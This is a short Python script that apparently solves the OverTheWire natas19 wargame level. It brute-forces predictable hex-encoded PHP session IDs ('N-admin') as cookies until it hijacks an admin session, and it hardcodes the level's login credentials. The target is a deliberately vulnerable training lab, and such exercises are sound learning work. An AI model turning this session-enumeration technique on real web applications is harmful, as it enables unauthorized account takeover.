#! /usr/bin/python

import requests

def findAdminSession():
	url = "http://natas19.natas.labs.overthewire.org/"
	auth_username = "natas19"
	auth_password = "4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs"
	
	
	for i in range(1,641):
		if i % 10 == 0:
                	print('Checked {} sessions...'.format(i))
		
		val = bytes((str(i)+'-admin'), 'ascii').hex()
		cookies = {'PHPSESSID':val}
		r = requests.get(url, auth=(auth_username,auth_password), cookies=cookies)
		if "You are an admin." in r.text:
                	print('Got it! Session={}'.format(val))
                	print(r.text)
                	break

	print('Done.')


findAdminSession()
